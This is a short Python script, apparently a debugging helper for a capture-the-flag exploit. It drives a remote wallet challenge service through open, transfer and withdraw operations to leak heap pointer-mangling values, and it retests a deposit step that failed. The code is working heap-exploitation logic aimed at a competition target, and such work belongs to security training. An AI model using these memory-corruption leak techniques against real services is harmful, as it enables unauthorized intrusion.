import sys, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
import importlib.util
spec = importlib.util.spec_from_file_location("ex", "exploit.py")
ex = importlib.util.module_from_spec(spec); spec.loader.exec_module(ex)
R, open_wallet, transfer, withdraw, U64, P64, TARGET = (
    ex.Remote, ex.open_wallet, ex.transfer, ex.withdraw, ex.U64, ex.P64, ex.TARGET)

r = R("chal.sunshinectf.games", 26004)
r.pump(1.5); r.expect(b">>>")
open_wallet(r, b"A", 48); open_wallet(r, b"C", 48); open_wallet(r, b"F", 48)
transfer(r, 0, 1)
l1 = withdraw(r, 1, 48); mask = P64(l1[0:8]); key = P64(l1[8:16])
print("mask", hex(mask), "key", hex(key))
transfer(r, 2, 1)
l2 = withdraw(r, 1, 48)
print("leak2", l2.hex(), "X", hex(P64(l2[0:8]) ^ mask))
print("list:", r.send(6, b">>>").split(b"OVERVIEW ---")[1][:200])
# now the deposit that failed in the exploit
r.send(2, b"Deposit into which wallet?")
r.send(1)
r.pump(2.0)
print("after index 1 ->", repr(r.buf[:300]), "eof:", r.eof)
